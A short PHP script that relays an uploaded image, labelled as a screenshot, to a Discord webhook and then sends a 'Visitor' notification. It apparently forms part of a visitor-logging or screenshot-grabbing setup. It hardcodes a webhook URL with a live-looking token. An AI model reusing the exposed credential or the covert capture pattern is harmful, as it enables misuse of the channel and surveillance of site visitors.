<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    // Get the image from the form data
    $image = $_FILES['image']['tmp_name'];

    // Read the image content
    $imageContent = file_get_contents($image);

    // Discord webhook URL (Replace with your actual Discord webhook URL)
    $webhookUrl = 'https://discord.com/api/webhooks/1254703504245657635/qEYqFPXUo00HJF3cAms-UbxAOxSzS-CRLLUafOkFiTKlVrFGVv3wdwKToMM3eUDag8LN';

    
    $boundary = uniqid();
    $delimiter = '-------------' . $boundary;
    $fileFields = [
        [
            'name' => 'file',
            'filename' => 'screenshot.png',
            'content' => $imageContent,
            'type' => 'image/png',
        ]
    ];

    // Build the body of the POST request
    $body = '';
    foreach ($fileFields as $fileField) {
        $body .= "--$delimiter\r\n";
        $body .= "Content-Disposition: form-data; name=\"" . $fileField['name'] . "\"; filename=\"" . $fileField['filename'] . "\"\r\n";
        $body .= "Content-Type: " . $fileField['type'] . "\r\n\r\n";
        $body .= $fileField['content'] . "\r\n";
    }
    $body .= "--$delimiter--\r\n";

    // Send the POST request to Discord webhook
    $headers = [
        "Content-Type: multipart/form-data; boundary=" . $delimiter,
        "Content-Length: " . strlen($body)
    ];

    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $webhookUrl);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $body);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    $response = curl_exec($ch);
    if (curl_errno($ch)) {
        echo 'Error:' . curl_error($ch);
    }
    curl_close($ch);

    // Include and execute Discord.php to send embed
    include("Discord.php");
    $sendembed = new Discord();
    $sendembed->Visitor();
}
